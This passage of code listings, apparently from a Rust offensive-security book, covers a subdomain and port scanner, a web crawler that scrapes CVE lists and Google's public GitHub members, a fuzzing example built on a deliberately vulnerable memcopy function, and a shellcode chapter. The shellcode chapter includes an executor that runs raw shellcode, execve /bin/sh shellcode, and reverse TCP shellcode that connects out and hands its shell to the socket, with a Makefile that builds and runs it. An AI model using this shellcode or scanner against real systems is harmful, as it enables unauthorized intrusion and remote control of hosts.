    543, 544, 5101, 144, 7, 389, 8009, 3128, 444, 9999, 5009, 7070, 5190, 3000, 5432, 1900, 3986,
    13, 1029, 9, 5051, 6646, 49157, 1028, 873, 1755, 2717, 4899, 9100, 119, 37, 1000, 3001, 5001,
    82, 10010, 1030, 9090, 2107, 1024, 2103, 6004, 1801, 5050, 19, 8031, 1041, 255, 2967, 1049,
    1048, 1053, 3703, 1056, 1065, 1064, 1054, 17, 808, 3689, 1031, 1044, 1071, 5901, 9102, 100,
    8010, 2869, 1039, 5120, 4001, 9000, 2105, 636, 1038, 2601, 7000, 1, 1066, 1069, 625, 311, 280,
    254, 4000, 5003, 1761, 2002, 2005, 1998, 1032, 1050, 6112, 3690, 1521, 2161, 6002, 1080, 2401,
    4045, 902, 7937, 787, 1058, 2383, 32771, 1033, 1040, 1059, 50000, 5555, 10001, 1494, 2301, 593,
    3, 3268, 7938, 1234, 1022, 1035, 9001, 1074, 8002, 1036, 1037, 464, 1935, 6666, 2003, 497,
    5601, 9200, 9300,
];
```
ch_04/tricoder/src/dns.rs
```rust
use crate::modules::Subdomain;
use std::{sync::Arc, time::Duration};
use trust_dns_resolver::{
    config::{ResolverConfig, ResolverOpts},
    name_server::{GenericConnection, GenericConnectionProvider, TokioRuntime},
    AsyncResolver,
};

pub type Resolver = Arc<AsyncResolver<GenericConnection, GenericConnectionProvider<TokioRuntime>>>;

pub async fn resolves(dns_resolver: &Resolver, domain: Subdomain) -> Option<Subdomain> {
    if dns_resolver.lookup_ip(domain.domain.as_str()).await.is_ok() {
        return Some(domain);
    }

    None
}

pub fn new_resolver() -> Resolver {
    let mut opts = ResolverOpts::default();
    opts.timeout = Duration::from_secs(4);

    let resolver = AsyncResolver::tokio(ResolverConfig::default(), opts)
        .expect("dns/new_resolver: building DNS client");

    return Arc::new(resolver);
}
```
ch_04/tricoder/src/error.rs
```rust
use thiserror::Error;

#[derive(Error, Debug, Clone)]
pub enum Error {
    #[error("Usage: tricoder <kerkour.com>")]
    CliUsage,
    #[error("Reqwest: {0}")]
    Reqwest(String),
    #[error("tokio join error: {0}")]
    TokioJoinError(String),
    #[error("{0}: Invalid HTTP response")]
    InvalidHttpResponse(String),
}

impl std::convert::From<reqwest::Error> for Error {
    fn from(err: reqwest::Error) -> Self {
        Error::Reqwest(err.to_string())
    }
}

impl std::convert::From<tokio::task::JoinError> for Error {
    fn from(err: tokio::task::JoinError) -> Self {
        Error::TokioJoinError(err.to_string())
    }
}
```
ch_04/tricoder/src/ports.rs
```rust
use crate::{
    common_ports::MOST_COMMON_PORTS,
    modules::{Port, Subdomain},
};
use futures::{stream, StreamExt};
use std::net::{SocketAddr, ToSocketAddrs};
use std::time::Duration;
use tokio::net::TcpStream;

pub async fn scan_ports(concurrency: usize, mut subdomain: Subdomain) -> Subdomain {
    let socket_addresses: Vec<SocketAddr> = format!("{}:1024", subdomain.domain)
        .to_socket_addrs()
        .expect("port scanner: Creating socket address")
        .collect();

    if socket_addresses.len() == 0 {
        return subdomain;
    }

    let socket_address = socket_addresses[0];

    subdomain.open_ports = stream::iter(MOST_COMMON_PORTS.into_iter())
        .map(|port| async move {
            let port = scan_port(socket_address, *port).await;
            if port.is_open {
                return Some(port);
            }
            None
        })
        .buffer_unordered(concurrency)
        .filter_map(|port| async { port })
        .collect()
        .await;

    subdomain
}

async fn scan_port(mut socket_address: SocketAddr, port: u16) -> Port {
    let timeout = Duration::from_secs(3);
    socket_address.set_port(port);

    let is_open = matches!(
        tokio::time::timeout(timeout, TcpStream::connect(&socket_address)).await,
        Ok(Ok(_)),
    );

    Port {
        port: port,
        is_open,
        findings: Vec::new(),
    }
}
```
ch_04/tricoder/src/main.rs
```rust
use std::env;

use anyhow::Result;
use clap::{Arg, Command};

mod cli;
mod common_ports;
mod dns;
mod error;
mod modules;
mod ports;
pub use error::Error;

fn main() -> Result<()> {
    env::set_var("RUST_LOG", "info,trust_dns_proto=error");
    env_logger::init();

    let cli = Command::new(clap::crate_name!())
        .version(clap::crate_version!())
        .about(clap::crate_description!())
        .subcommand(Command::new("modules").about("List all modules"))
        .subcommand(
            Command::new("scan").about("Scan a target").arg(
                Arg::new("target")
                    .help("The domain name to scan")
                    .required(true)
                    .index(1),
            ),
        )
        .arg_required_else_help(true)
        .get_matches();

    if let Some(_) = cli.subcommand_matches("modules") {
        cli::modules();
    } else if let Some(matches) = cli.subcommand_matches("scan") {
        // we can safely unwrap as the argument is required
        let target = matches.value_of("target").unwrap();
        cli::scan(target)?;
    }

    Ok(())
}
```
### Chapter 5 crawler: web crawler
Cargo.toml
```toml
[package]
name = "crawler"
version = "0.1.0"
authors = ["Sylvain Kerkour <sylvain@kerkour.fr>"]
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
clap = { version = "3.1", features = ["cargo"] }
tokio = { version = "1", features = ["full"] }
reqwest = { version = "0.11", default-features = false, features = ["json", "rustls-tls"] }
anyhow = "1.0"
thiserror = "1.0"
async-trait = "0.1"
log = "0.4"
env_logger = "0.9"
select = "0.6.0-alpha.1"
url = "2.2"
futures = "0.3"
tokio-stream = "0.1"
fantoccini = { version = "0.19", default-features = false, features = ["rustls-tls"] }
serde_json = "1.0"
serde = { version = "1.0", features = ["derive"] }
regex = "1"
```
ch_05/crawler/src/spiders/cvedetails.rs
```rust
use crate::error::Error;
use async_trait::async_trait;
use reqwest::Client;
use select::{
    document::Document,
    predicate::{Attr, Class, Name, Predicate},
};
use std::time::Duration;

pub struct CveDetailsSpider {
    http_client: Client,
}

#[derive(Debug, Clone)]
pub struct Cve {
    name: String,
    url: String,
    cwe_id: Option<String>,
    cwe_url: Option<String>,
    vulnerability_type: String,
    publish_date: String,
    update_date: String,
    score: f32,
    access: String,
    complexity: String,
    authentication: String,
    confidentiality: String,
    integrity: String,
    availability: String,
}

impl CveDetailsSpider {
    pub fn new() -> Self {
        let http_timeout = Duration::from_secs(6);
        let http_client = Client::builder()
            .timeout(http_timeout)
            .build()
            .expect("spiders/cvedetails: Building HTTP client");

        CveDetailsSpider { http_client }
    }
}

#[async_trait]
impl super::Spider for CveDetailsSpider {
    type Item = Cve;

    fn name(&self) -> String {
        String::from("cvedetails")
    }

    fn start_urls(&self) -> Vec<String> {
        vec!["https://www.cvedetails.com/vulnerability-list/vulnerabilities.html".to_string()]
    }

    async fn scrape(&self, url: String) -> Result<(Vec<Self::Item>, Vec<String>), Error> {
        log::info!("visiting: {}", url);

        let http_res = self.http_client.get(url).send().await?.text().await?;
        let mut items = Vec::new();

        let document = Document::from(http_res.as_str());

        let rows = document.select(Attr("id", "vulnslisttable").descendant(Class("srrowns")));
        for row in rows {
            let mut columns = row.select(Name("td"));
            let _ = columns.next(); // # column
            let cve_link = columns.next().unwrap().select(Name("a")).next().unwrap();
            let cve_name = cve_link.text().trim().to_string();
            let cve_url = self.normalize_url(cve_link.attr("href").unwrap());

            let cwe = columns
                .next()
                .unwrap()
                .select(Name("a"))
                .next()
                .map(|cwe_link| {
                    (
                        cwe_link.text().trim().to_string(),
                        self.normalize_url(cwe_link.attr("href").unwrap()),
                    )
                });

            let _ = columns.next(); // # of exploits column

            let vulnerability_type = columns.next().unwrap().text().trim().to_string();

            let publish_date = columns.next().unwrap().text().trim().to_string();
            let update_date = columns.next().unwrap().text().trim().to_string();

            let score: f32 = columns
                .next()
                .unwrap()
                .text()
                .trim()
                .to_string()
                .parse()
                .unwrap();

            let _ = columns.next(); // Gained Access Level  column

            let access = columns.next().unwrap().text().trim().to_string();
            let complexity = columns.next().unwrap().text().trim().to_string();
            let authentication = columns.next().unwrap().text().trim().to_string();
            let confidentiality = columns.next().unwrap().text().trim().to_string();
            let integrity = columns.next().unwrap().text().trim().to_string();
            let availability = columns.next().unwrap().text().trim().to_string();

            let cve = Cve {
                name: cve_name,
                url: cve_url,
                cwe_id: cwe.as_ref().map(|cwe| cwe.0.clone()),
                cwe_url: cwe.as_ref().map(|cwe| cwe.1.clone()),
                vulnerability_type,
                publish_date,
                update_date,
                score,
                access,
                complexity,
                authentication,
                confidentiality,
                integrity,
                availability,
            };
            items.push(cve);
        }

        let next_pages_links = document
            .select(Attr("id", "pagingb").descendant(Name("a")))
            .filter_map(|n| n.attr("href"))
            .map(|url| self.normalize_url(url))
            .collect::<Vec<String>>();

        Ok((items, next_pages_links))
    }

    async fn process(&self, item: Self::Item) -> Result<(), Error> {
        println!("{:?}", item);

        Ok(())
    }
}

impl CveDetailsSpider {
    fn normalize_url(&self, url: &str) -> String {
        let url = url.trim();

        if url.starts_with("//www.cvedetails.com") {
            return format!("https:{}", url);
        } else if url.starts_with("/") {
            return format!("https://www.cvedetails.com{}", url);
        }

        return url.to_string();
    }
}
```
ch_05/crawler/src/spiders/github.rs
```rust
use crate::error::Error;
use async_trait::async_trait;
use regex::Regex;
use reqwest::{header, Client};
use serde::{Deserialize, Serialize};
use std::time::Duration;

pub struct GitHubSpider {
    http_client: Client,
    page_regex: Regex,
    expected_number_of_results: usize,
}

impl GitHubSpider {
    pub fn new() -> Self {
        let http_timeout = Duration::from_secs(6);
        let mut headers = header::HeaderMap::new();
        headers.insert(
            "Accept",
            header::HeaderValue::from_static("application/vnd.github.v3+json"),
        );

        let http_client = Client::builder()
            .timeout(http_timeout)
            .default_headers(headers)
            .user_agent(
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
            )
            .build()
            .expect("spiders/github: Building HTTP client");

        let page_regex =
            Regex::new(".*page=([0-9]*).*").expect("spiders/github: Compiling page regex");

        GitHubSpider {
            http_client,
            page_regex,
            expected_number_of_results: 100,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GitHubItem {
    login: String,
    id: u64,
    node_id: String,
    html_url: String,
    avatar_url: String,
}

#[async_trait]
impl super::Spider for GitHubSpider {
    type Item = GitHubItem;

    fn name(&self) -> String {
        String::from("github")
    }

    fn start_urls(&self) -> Vec<String> {
        vec!["https://api.github.com/orgs/google/public_members?per_page=100&page=1".to_string()]
    }

    async fn scrape(&self, url: String) -> Result<(Vec<GitHubItem>, Vec<String>), Error> {
        let items: Vec<GitHubItem> = self.http_client.get(&url).send().await?.json().await?;

        let next_pages_links = if items.len() == self.expected_number_of_results {
            let captures = self.page_regex.captures(&url).unwrap();
            let old_page_number = captures.get(1).unwrap().as_str().to_string();
            let mut new_page_number = old_page_number
                .parse::<usize>()
                .map_err(|_| Error::Internal("spider/github: parsing page number".to_string()))?;
            new_page_number += 1;

            let next_url = url.replace(
                format!("&page={}", old_page_number).as_str(),
                format!("&page={}", new_page_number).as_str(),
            );
            vec![next_url]
        } else {
            Vec::new()
        };

        Ok((items, next_pages_links))
    }

    async fn process(&self, item: Self::Item) -> Result<(), Error> {
        println!("{}, {}, {}", item.login, item.html_url, item.avatar_url);

        Ok(())
    }
}
```
ch_05/crawler/src/spiders/quotes.rs
```rust
use crate::error::Error;
use async_trait::async_trait;
use fantoccini::{Client, ClientBuilder};
use select::{
    document::Document,
    predicate::{Class, Name, Predicate},
};
use tokio::sync::Mutex;

pub struct QuotesSpider {
    webdriver_client: Mutex<Client>,
}

impl QuotesSpider {
    pub async fn new() -> Result<Self, Error> {
        let mut caps = serde_json::map::Map::new();
        let chrome_opts = serde_json::json!({ "args": ["--headless", "--disable-gpu"] });
        caps.insert("goog:chromeOptions".to_string(), chrome_opts);
        let webdriver_client = ClientBuilder::rustls()
            .capabilities(caps)
            .connect("http://localhost:4444")
            .await?;

        Ok(QuotesSpider {
            webdriver_client: Mutex::new(webdriver_client),
        })
    }
}

#[derive(Debug, Clone)]
pub struct QuotesItem {
    quote: String,
    author: String,
}

#[async_trait]
impl super::Spider for QuotesSpider {
    type Item = QuotesItem;

    fn name(&self) -> String {
        String::from("quotes")
    }

    fn start_urls(&self) -> Vec<String> {
        vec!["https://quotes.toscrape.com/js".to_string()]
    }

    async fn scrape(&self, url: String) -> Result<(Vec<Self::Item>, Vec<String>), Error> {
        let mut items = Vec::new();
        let html = {
            let webdriver = self.webdriver_client.lock().await;
            webdriver.goto(&url).await?;
            webdriver.source().await?
        };

        let document = Document::from(html.as_str());

        let quotes = document.select(Class("quote"));
        for quote in quotes {
            let mut spans = quote.select(Name("span"));
            let quote_span = spans.next().unwrap();
            let quote_str = quote_span.text().trim().to_string();

            let author = spans
                .next()
                .unwrap()
                .select(Class("author"))
                .next()
                .unwrap()
                .text()
                .trim()
                .to_string();

            items.push(QuotesItem {
                quote: quote_str,
                author,
            });
        }

        let next_pages_link = document
            .select(
                Class("pager")
                    .descendant(Class("next"))
                    .descendant(Name("a")),
            )
            .filter_map(|n| n.attr("href"))
            .map(|url| self.normalize_url(url))
            .collect::<Vec<String>>();

        Ok((items, next_pages_link))
    }

    async fn process(&self, item: Self::Item) -> Result<(), Error> {
        println!("{}", item.quote);
        println!("by {}\n", item.author);
        Ok(())
    }
}

impl QuotesSpider {
    fn normalize_url(&self, url: &str) -> String {
        let url = url.trim();

        if url.starts_with("/") {
            return format!("https://quotes.toscrape.com{}", url);
        }

        return url.to_string();
    }
}
```
ch_05/crawler/src/spiders/mod.rs
```rust
use crate::error::Error;
use async_trait::async_trait;

pub mod cvedetails;
pub mod github;
pub mod quotes;

#[async_trait]
pub trait Spider: Send + Sync {
    type Item;

    fn name(&self) -> String;
    fn start_urls(&self) -> Vec<String>;
    async fn scrape(&self, url: String) -> Result<(Vec<Self::Item>, Vec<String>), Error>;
    async fn process(&self, item: Self::Item) -> Result<(), Error>;
}
```
ch_05/crawler/src/crawler.rs
```rust
use crate::spiders::Spider;
use futures::stream::StreamExt;
use std::{
    collections::HashSet,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc,
    },
    time::Duration,
};
use tokio::{
    sync::{mpsc, Barrier},
    time::sleep,
};

pub struct Crawler {
    delay: Duration,
    crawling_concurrency: usize,
    processing_concurrency: usize,
}

impl Crawler {
    pub fn new(
        delay: Duration,
        crawling_concurrency: usize,
        processing_concurrency: usize,
    ) -> Self {
        Crawler {
            delay,
            crawling_concurrency,
            processing_concurrency,
        }
    }

    pub async fn run<T: Send + 'static>(&self, spider: Arc<dyn Spider<Item = T>>) {
        let mut visited_urls = HashSet::<String>::new();
        let crawling_concurrency = self.crawling_concurrency;
        let crawling_queue_capacity = crawling_concurrency * 400;
        let processing_concurrency = self.processing_concurrency;
        let processing_queue_capacity = processing_concurrency * 10;
        let active_spiders = Arc::new(AtomicUsize::new(0));

        let (urls_to_visit_tx, urls_to_visit_rx) = mpsc::channel(crawling_queue_capacity);
        let (items_tx, items_rx) = mpsc::channel(processing_queue_capacity);
        let (new_urls_tx, mut new_urls_rx) = mpsc::channel(crawling_queue_capacity);
        let barrier = Arc::new(Barrier::new(3));

        for url in spider.start_urls() {
            visited_urls.insert(url.clone());
            let _ = urls_to_visit_tx.send(url).await;
        }

        self.launch_processors(
            processing_concurrency,
            spider.clone(),
            items_rx,
            barrier.clone(),
        );

        self.launch_scrapers(
            crawling_concurrency,
            spider.clone(),
            urls_to_visit_rx,
            new_urls_tx.clone(),
            items_tx,
            active_spiders.clone(),
            self.delay,
            barrier.clone(),
        );

        loop {
            if let Some((visited_url, new_urls)) = new_urls_rx.try_recv().ok() {
                visited_urls.insert(visited_url);

                for url in new_urls {
                    if !visited_urls.contains(&url) {
                        visited_urls.insert(url.clone());
                        log::debug!("queueing: {}", url);
                        let _ = urls_to_visit_tx.send(url).await;
                    }
                }
            }

            if new_urls_tx.capacity() == crawling_queue_capacity // new_urls channel is empty
            && urls_to_visit_tx.capacity() == crawling_queue_capacity // urls_to_visit channel is empty
            && active_spiders.load(Ordering::SeqCst) == 0
            {
                // no more work, we leave
                break;
            }

            sleep(Duration::from_millis(5)).await;
        }

        log::info!("crawler: control loop exited");

        // we drop the transmitter in order to close the stream
        drop(urls_to_visit_tx);

        // and then we wait for the streams to complete
        barrier.wait().await;
    }

    fn launch_processors<T: Send + 'static>(
        &self,
        concurrency: usize,
        spider: Arc<dyn Spider<Item = T>>,
        items: mpsc::Receiver<T>,
        barrier: Arc<Barrier>,
    ) {
        tokio::spawn(async move {
            tokio_stream::wrappers::ReceiverStream::new(items)
                .for_each_concurrent(concurrency, |item| async {
                    let _ = spider.process(item).await;
                })
                .await;

            barrier.wait().await;
        });
    }

    fn launch_scrapers<T: Send + 'static>(
        &self,
        concurrency: usize,
        spider: Arc<dyn Spider<Item = T>>,
        urls_to_visit: mpsc::Receiver<String>,
        new_urls_tx: mpsc::Sender<(String, Vec<String>)>,
        items_tx: mpsc::Sender<T>,
        active_spiders: Arc<AtomicUsize>,
        delay: Duration,
        barrier: Arc<Barrier>,
    ) {
        tokio::spawn(async move {
            tokio_stream::wrappers::ReceiverStream::new(urls_to_visit)
                .for_each_concurrent(concurrency, |queued_url| {
                    let queued_url = queued_url.clone();
                    async {
                        active_spiders.fetch_add(1, Ordering::SeqCst);
                        let mut urls = Vec::new();
                        let res = spider
                            .scrape(queued_url.clone())
                            .await
                            .map_err(|err| {
                                log::error!("{}", err);
                                err
                            })
                            .ok();

                        if let Some((items, new_urls)) = res {
                            for item in items {
                                let _ = items_tx.send(item).await;
                            }
                            urls = new_urls;
                        }

                        let _ = new_urls_tx.send((queued_url, urls)).await;
                        sleep(delay).await;
                        active_spiders.fetch_sub(1, Ordering::SeqCst);
                    }
                })
                .await;

            drop(items_tx);
            barrier.wait().await;
        });
    }
}
```
ch_05/crawler/src/error.rs
```rust
use thiserror::Error;

#[derive(Error, Debug, Clone)]
pub enum Error {
    #[error("Internal")]
    Internal(String),
    #[error("Spider is not valid: {0}")]
    InvalidSpider(String),
    #[error("Reqwest: {0}")]
    Reqwest(String),
    #[error("WebDriver: {0}")]
    WebDriver(String),
}

impl std::convert::From<reqwest::Error> for Error {
    fn from(err: reqwest::Error) -> Self {
        Error::Reqwest(err.to_string())
    }
}

impl std::convert::From<fantoccini::error::CmdError> for Error {
    fn from(err: fantoccini::error::CmdError) -> Self {
        Error::WebDriver(err.to_string())
    }
}

impl std::convert::From<fantoccini::error::NewSessionError> for Error {
    fn from(err: fantoccini::error::NewSessionError) -> Self {
        Error::WebDriver(err.to_string())
    }
}
```
ch_05/crawler/src/main.rs
```rust
use clap::{Command, Arg};
use std::{env, sync::Arc, time::Duration};

mod crawler;
mod error;
mod spiders;

use crate::crawler::Crawler;
use error::Error;

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let cli = Command::new(clap::crate_name!())
        .version(clap::crate_version!())
        .about(clap::crate_description!())
        .subcommand(Command::new("spiders").about("List all spiders"))
        .subcommand(
            Command::new("run").about("Run a spider").arg(
                Arg::new("spider")
                    .short('s')
                    .long("spider")
                    .help("The spider to run")
                    .takes_value(true)
                    .required(true),
            ),
        )
        .arg_required_else_help(true)
        .get_matches();

    env::set_var("RUST_LOG", "info,crawler=debug");
    env_logger::init();

    if let Some(_) = cli.subcommand_matches("spiders") {
        let spider_names = vec!["cvedetails", "github", "quotes"];
        for name in spider_names {
            println!("{}", name);
        }
    } else if let Some(matches) = cli.subcommand_matches("run") {
        // we can safely unwrap as the argument is required
        let spider_name = matches.value_of("spider").unwrap();
        let crawler = Crawler::new(Duration::from_millis(200), 2, 500);

        match spider_name {
            "cvedetails" => {
                let spider = Arc::new(spiders::cvedetails::CveDetailsSpider::new());
                crawler.run(spider).await;
            }
            "github" => {
                let spider = Arc::new(spiders::github::GitHubSpider::new());
                crawler.run(spider).await;
            }
            "quotes" => {
                let spider = spiders::quotes::QuotesSpider::new().await?;
                let spider = Arc::new(spider);
                crawler.run(spider).await;
            }
            _ => return Err(Error::InvalidSpider(spider_name.to_string()).into()),
        };
    }

    Ok(())
}
```

### Chapter 6 Use Cargo fuzz
#### install cargo-fuzz
```shell
cargo install -f cargo-fuzz
rustup install nightly
```
#### create new project
```shell
cargo new fuzzing --lib
```

Add the following code to `lib.rs`
```rust
pub fn vulnerable_memcopy(dest: &mut [u8], src: &[u8], n: usize) {
    let mut i = 0;

    while i < n {
        dest[i] = src[i];
        i += 1;
    }
}
```
#### initialize `cargo-fuzz`
```shell
cargo fuzz init
cargo fuzz list
```
#### Add fuzz code
ch_06/fuzzing/fuzz/Cargo.toml
```toml
[package]
name = "fuzzing-fuzz"
version = "0.0.0"
authors = ["Automatically generated"]
publish = false
edition = "2021"

[package.metadata]
cargo-fuzz = true

[dependencies]
libfuzzer-sys = "0.4"
arbitrary = { version = "1", features = ["derive"] }

[dependencies.fuzzing]
path = ".."

# Prevent this from interfering with workspaces
[workspace]
members = ["."]

[[bin]]
name = "fuzz_target_1"
path = "fuzz_targets/fuzz_target_1.rs"
test = false
doc = false
```
ch_06/fuzzing/fuzz/fuzz_targets/fuzz_target_1.rs
```rust
#![no_main]
use libfuzzer_sys::fuzz_target;

#[derive(Clone, Debug, arbitrary::Arbitrary)]
struct MemcopyInput {
    dest: Vec<u8>,
    src: Vec<u8>,
    n: usize,
}

fuzz_target!(|data: MemcopyInput| {
    let mut data = data.clone();
    fuzzing::vulnerable_memcopy(&mut data.dest, &data.src, data.n);
});
```
#### run fuzz
```shell
cargo +nightly fuzz run fuzz_target_1
```
### Chapter 8 Write Shellcodes
#### executor
Cargo.toml
```toml
[package]
name = "executor"
version = "0.1.0"
authors = ["Sylvain Kerkour <sylvain@kerkour.fr>"]
edition = "2021"
```
ch_08/executor/src/main.rs
```rust
use std::mem;

// we do this trick because otherwise only the reference is in the .text section
const SHELLCODE_BYTES: &[u8] = include_bytes!("../../shellcode.bin");
const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../../shellcode.bin");

fn main() {
    let exec_shellcode: extern "C" fn() -> ! =
        unsafe { mem::transmute(&SHELLCODE as *const _ as *const ()) };
    exec_shellcode();
}
```
#### hello_world
Cargo.toml
```toml
[package]
name = "hello_world"
version = "0.1.0"
authors = ["Sylvain Kerkour <sylvain@kerkour.fr>"]
edition = "2021"

[profile.dev]
panic = "abort"

[profile.release]
panic = "abort"
opt-level = "z"
lto = true
codegen-units = 1
```
ch_08/hello_world/src/main.rs
```rust
#![no_std]
#![no_main]

use core::arch::asm;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

const SYS_WRITE: usize = 1;
const SYS_EXIT: usize = 60;
const STDOUT: usize = 1;
static MESSAGE: &str = "hello world\n";

unsafe fn syscall1(syscall: usize, arg1: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

#[no_mangle]
fn _start() {
    unsafe {
        syscall3(
            SYS_WRITE,
            STDOUT,
            MESSAGE.as_ptr() as usize,
            MESSAGE.len() as usize,
        );

        syscall1(SYS_EXIT, 0)
    };
}
```
ch_08/hello_world/.cargo/config.toml
```toml
[build]
rustflags = ["-C", "link-arg=-nostdlib", "-C", "link-arg=-static", "-C", "link-arg=-Wl,-T../shellcode.ld,--build-id=none"]
```
ch_08/shellcode.ld
```ld
ENTRY(_start);

SECTIONS
{
	. = ALIGN(16);
	.text :
	{
		*(.text.prologue)
		*(.text)
		*(.rodata)
	}
	.data :
	{
		*(.data)
	}

	/DISCARD/ :
	{
		*(.interp)
		*(.comment)
		*(.debug_frame)
	}
}
```
#### shell
Cargo.toml
```toml
[package]
name = "shell"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]


[profile.dev]
panic = "abort"

[profile.release]
panic = "abort"
opt-level = "z"
lto = true
codegen-units = 1
```
ch_08/shell/src/main.rs
```rust
#![no_std]
#![no_main]

use core::arch::asm;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

const SYS_EXECVE: usize = 59;
const SHELL: &str = "/bin/sh\x00";
const ARGV: [*const &str; 2] = [&SHELL, core::ptr::null()];
const NULL_ENV: usize = 0;

unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

#[no_mangle]
fn _start() -> ! {
    let shell: &str = "/bin/sh\x00";
    let argv: [*const &str; 2] = [&shell, core::ptr::null()];

    unsafe {
        syscall3(
            SYS_EXECVE,
            shell.as_ptr() as usize,
            argv.as_ptr() as usize,
            NULL_ENV,
        );
    };

    loop {}
}
```
ch_08/shell/.cargo/config.toml
```toml
[build]
rustflags = ["-C", "link-arg=-nostdlib", "-C", "link-arg=-static", "-C", "link-arg=-Wl,-T../shellcode.ld,--build-id=none"]
```

#### reverse tcp
ch_08/reverse_tcp/Cargo.toml
```toml
[package]
name = "reverse_tcp"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]

[profile.dev]
panic = "abort"

[profile.release]
panic = "abort"
opt-level = "z"
lto = true
codegen-units = 1
```
ch_08/reverse_tcp/src/main.rs
```rust
#![no_std]
#![no_main]

use core::arch::asm;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

const PORT: u16 = 0x6A1F; // 8042
const IP: u32 = 0x0100007f; // 127.0.0.1

const SYS_DUP2: usize = 33;
const SYS_SOCKET: usize = 41;
const SYS_CONNECT: usize = 42;
const SYS_EXECVE: usize = 59;

const AF_INET: usize = 2;
const SOCK_STREAM: usize = 1;
const IPPROTO_IP: usize = 0;

const STDIN: usize = 0;
const STDOUT: usize = 1;
const STDERR: usize = 2;

#[repr(C)]
struct sockaddr_in {
    sin_family: u16,
    sin_port: u16,
    sin_addr: in_addr,
    sin_zero: [u8; 8],
}

#[repr(C)]
struct in_addr {
    s_addr: u32,
}

unsafe fn syscall2(syscall: usize, arg1: usize, arg2: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

unsafe fn syscall3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

#[no_mangle]
fn _start() -> ! {
    let shell: &str = "/bin/sh\x00";
    let argv: [*const &str; 2] = [&shell, core::ptr::null()];
    let socket_addr = sockaddr_in {
        sin_family: AF_INET as u16,
        sin_port: PORT,
        sin_addr: in_addr { s_addr: IP },
        sin_zero: [0; 8],
    };
    let socket_addr_len = core::mem::size_of::<sockaddr_in>();

    unsafe {
        let socket_fd = syscall3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
        syscall3(
            SYS_CONNECT,
            socket_fd,
            &socket_addr as *const sockaddr_in as usize,
            socket_addr_len as usize,
        );

        syscall2(SYS_DUP2, socket_fd, STDIN);
        syscall2(SYS_DUP2, socket_fd, STDOUT);
        syscall2(SYS_DUP2, socket_fd, STDERR);

        // for i in 0..3 {
        //     syscall2(SYS_DUP2, socket_fd, i);
        // }

        syscall3(SYS_EXECVE, shell.as_ptr() as usize, argv.as_ptr() as usize, 0);
    };

    loop {}
}
```
ch_08/reverse_tcp/.cargo/config.toml
```toml
[build]
rustflags = ["-C", "link-arg=-nostdlib", "-C", "link-arg=-static", "-C", "link-arg=-Wl,-T../shellcode.ld,--build-id=none"]
```
ch_08/Makefile
```
.PHONY: execute
execute:
	cd executor && cargo run


.PHONY: dump_shellcode
dump_shellcode:
	objdump -D -b binary -mi386 -Mx86-64 -Mintel -z shellcode.bin


.PHONY: fmt
fmt:
	cd hello_world && cargo fmt
	cd executor && cargo fmt



.PHONY: run_hello_world
run_hello_world: hello_world execute

.PHONY: hello_world
hello_world:
	cd hello_world && cargo build --release
	strip -s hello_world/target/release/hello_world
	objcopy -O binary hello_world/target/release/hello_world shellcode.bin

.PHONY: dump_hello_world
dump_hello_world: hello_world dump_shellcode
# objdump -Mintel -s -d hello_world/target/release/hello_world



.PHONY: shell
shell:
	cd shell && cargo build --release
	strip -s shell/target/release/shell
	objcopy -O binary shell/target/release/shell shellcode.bin

.PHONY: dump_shell
dump_shell: shell dump_shellcode

.PHONY: run_shell
run_shell: shell execute

.PHONY: build_shell_debug
build_shell_debug:
	cd shell && cargo build


.PHONY: tcp
tcp:
	cd reverse_tcp && cargo build --release
	strip -s reverse_tcp/target/release/reverse_tcp
	objcopy -O binary reverse_tcp/target/release/reverse_tcp shellcode.bin

.PHONY: dump_tcp
dump_tcp: tcp dump_shellcode

.PHONY: run_tcp
run_tcp: tcp execute
```